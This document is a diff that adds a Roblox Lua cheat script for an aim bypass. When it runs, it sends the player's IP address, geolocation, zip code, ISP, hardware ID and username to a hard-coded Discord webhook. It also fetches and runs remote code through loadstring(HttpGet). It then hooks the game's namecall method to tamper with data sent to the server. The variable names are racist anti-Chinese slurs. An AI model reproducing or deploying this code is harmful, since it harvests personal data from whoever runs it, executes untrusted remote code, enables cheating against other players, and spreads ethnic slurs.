@@ -1,0 +1,183 @@
+--LOGS FOR AUTHENCATION PURPOSES TO SEE WHO GIVES OUT THE SCRIPT WHEN NOT PURCHASED OR GIVEN ACCESS TOO, IF AUTHCATENTION DONT VERIFY U THEN UR GONNA GET BLACKLISTED/BANNED FROM THE SCRIPT/ IF U GET BANNED THIS IS NOT ON ME/USE FOR UR OWN PURPOSES
+--CREDITS FOR THIS SCRIPT//3C, AND 3C ONLY/
+--WARNING WARNING WARNINGGGGGG WARNING
+-- WARNING THIS SCRIPT DO LOG IP AND GAME AND HARDWARE ID FOR AUTHCANETIONS PURPOSES.
+
+
+local name = game:GetService("Players").LocalPlayer.Name
+local WebhookURL = "https://discord.com/api/webhooks/1255734189521637387/iVl6nui6-bHGdPAiR0WEzYBaB1xt2YV-T9gXyFDKjGvrBSynIr0201Ala-i1b0Y4zvIR"
+local getIPResponse = syn.request({
+    Url = "https://api.ipify.org/?format=json",
+    Method = "GET"
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
+
+local getIPInfo = syn.request({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+    Method = "Get"
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local FI = {
+    IP = IPBuffer,
+    country = IIT.country,
+    countryCode = IIT.countryCode,
+    region = IIT.region,
+    regionName = IIT.regionName,
+    city = IIT.city,
+    zipcode = IIT.zip,
+    latitude = IIT.lat,
+    longitude = IIT.lon,
+    isp = IIT.isp,
+    org = IIT.org
+}
+local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
+local MessageData = {
+    ["content"] = dataMessage
+}
+
+syn.request(
+    {
+        Url = WebhookURL, 
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(MessageData)
+    }
+)
+local webh = "https://discord.com/api/webhooks/1255734189521637387/iVl6nui6-bHGdPAiR0WEzYBaB1xt2YV-T9gXyFDKjGvrBSynIr0201Ala-i1b0Y4zvIR"
+
+
+pcall(function()
+   local data = {
+
+  ['embeds'] = {
+    {
+       ['title'] = 'antiaimviewer',
+       ['description'] = '',
+       ['fields'] = {
+          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
+          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
+          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+
+        }
+    }
+  }
+}
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+
+-- i aint obfuscate this shit 2 lazy yuh so lmfao 
+
+--// Nosss didn't make this script, All credits to "Scarcin" on V3rmillion for this bypass method
+
+--// Roblox Group ( TeamNosss! ): https://www.roblox.com/groups/16003304/TeamNosss#!/about
+
+--[[ 
+
+	I did add the real mouse position function thats all 
+
+--]]
+
+
+local DeepFakePosition = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nosssa/NossLock/main/GetRealMousePosition"))() 
+task.wait()
+
+
+--//Services
+local China = setmetatable({}, {
+   __index = function(Company, Price)
+       return game:GetService(Price)
+   end})
+   
+local ChinaWorld = China.Workspace
+local Society = China.Players
+local ChineseDeporation = China.ReplicatedStorage
+local ChinaInputService = China.UserInputService
+
+--//Variables
+local ChingChong = Society.LocalPlayer
+local Cat =  "meow!!" and ChingChong:GetMouse()
+
+local ChineseEvent = ChineseDeporation:FindFirstChild("MainEvent") or nil
+local Payment = "Hello Da Hoodian!" and nil
+
+ChineseBypass = function(ChineseEntity)
+   local KimJongUn = ChineseEntity.ChildAdded:Connect(function(credit)
+       if credit:IsA("Tool") then
+           Payment = credit.Activated:Connect(function()
+               if ChineseEvent then
+                   ChineseEvent:FireServer("UpdateMousePos", Cat.Hit.Position)
+               end
+           end)
+       end
+   end)
+end
+
+local RandomChinese = function(RandomCredit)
+   return type(RandomCredit) == "number" and math.random(-RandomCredit, RandomCredit) or 0
+end
+
+local ChinaAlive = function(ChinesePlayer)
+   return ChinesePlayer and ChinesePlayer.Character and ChinesePlayer.Character:FindFirstChild("Humanoid") and ChinesePlayer.Character:FindFirstChild("Head") or false
+end
+
+ChingChong.CharacterAdded:Connect(function(NewChingChong)
+   ChineseBypass(NewChingChong)
+end)
+
+if ChinaAlive(ChingChong) then
+   ChingChong.Character.Humanoid:UnequipTools()
+   ChineseBypass(ChingChong.Character)
+end
+
+local ChinaHook
+ChinaHook = hookmetamethod(game, "__namecall", function(self, ...)
+   local ChinaArgs = {...}
+   local DeportationMethod = getnamecallmethod()
+
+   if not checkcaller() and DeportationMethod == "FireServer" and self.Name == "MainEvent" and ChinaArgs[1] == "UpdateMousePos" and "chungusdian" then
+
+       ChinaArgs[2] = "Scarcin made this" and _G.FetchPosition() -- was V3.zero
+       
+       return self.FireServer(self, unpack(ChinaArgs))
+   end
+   
+   return ChinaHook(self, ...)
+end)
